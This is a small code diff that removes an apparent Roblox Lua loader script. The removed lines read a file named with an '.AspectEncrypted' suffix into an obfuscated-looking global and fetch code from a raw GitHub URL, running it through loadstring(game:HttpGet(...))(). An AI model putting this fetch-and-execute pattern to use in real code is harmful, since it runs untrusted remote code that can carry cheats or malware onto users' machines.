@@ -1,6 +1,0 @@
-
-_G.fjigfjhgfjgfjgrfdkhgjkfjhfjkgjhkgjhkfgjhljkgkhjgkhgkhjgkhjkgjhhjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjkcjgflkhgjfkhjfgkhlfkgjhgkhjlgjhgjhjkgjkhjkhgjhgkjkhgjklgfdgfhghjghjdfjkgjkfjgjigfjkgfjkfjgjfgjkfjkgjkfjgjdgjkfjkhjgjkhjkfkfkfdokgjfhSolol = readfile(FILE..".AspectEncrypted")
-
-
-
-local encodedString = loadstring(game:HttpGet("https://raw.githubusercontent.com/CharlieXFREE/SWAT/main/YO", true))()
